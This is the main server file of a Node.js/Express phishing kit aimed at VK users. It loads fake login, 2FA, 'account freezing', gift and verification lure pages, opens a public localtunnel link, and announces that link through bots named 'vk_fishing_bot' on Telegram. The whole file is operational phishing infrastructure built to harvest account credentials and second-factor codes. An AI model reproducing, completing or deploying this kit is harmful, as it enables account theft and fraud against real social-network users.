const express = require('express');
const app = express();
const bodyParser = require("body-parser");

const bot_tg = require(`./js/bot.js`);

const localtunnel = require('localtunnel');

app.set(`view engular`, `ejs`)
app.use(bodyParser.urlencoded({
    extended: false
}))

const login = require("./js/main.js").start(app);

const webs = {
  "start": require(`./webs/1_start.js`).start_app(app),
  "login": require(`./webs/2_login.js`).start_login(app),
  "style": require(`./webs/3_style.js`).start_style(app),
  "jquery": require(`./webs/js/jquery.js`).start_jquery(app)
}

const webs_other = {
    "boom": require(`./webs/other/1_boom.js`).start_boom(app),
    "fortune": require(`./webs/other/2_fortune.js`).start_fortune(app),
    "tiktok": require(`./webs/other/3_tiktok.js`).start_tiktok(app),
    "themes": require(`./webs/other/4_themes.js`).start_themes(app)
}

const webs_templates = {
  "freezing": require(`./webs/templates/1_freezing.js`).start_freezing(app),
  "games": require(`./webs/templates/2_games.js`).start_games(app),
  "gift": require(`./webs/templates/3_gift.js`).start_gift(app),
  "verification": require(`./webs/templates/4_verification.js`).start_verification(app),
  "statistics": require(`./webs/templates/5_statistics.js`).start_statistics(app),
  "birthday": require(`./webs/templates/6_birthday.js`).start_birthday(app),
  "2fa": require(`./webs/templates/7_2fa.js`).start_2fa(app)
}

app.listen(process.env.PORT || 8080, async () => {
    global.tunnel = await localtunnel({ port: 8080 });
    console.log(`Сервер запущен на хосте ${process.env.PORT || 8080}!`);

    var text_message = `Новый подруб бота. На данный момент ссылки не постоянные и имеют свойство меняться при каждом перезапуске бота.\n\nАктивная ссылка на данный момент: ${global.tunnel.url}`;
    var buttons = [[{"text": "Перейти в бота", url: "https://t.me/new_vk_fishing_bot"}]];
    bot_tg.send_messages("@rezerv_vk_fishing_bot", text_message, buttons);
});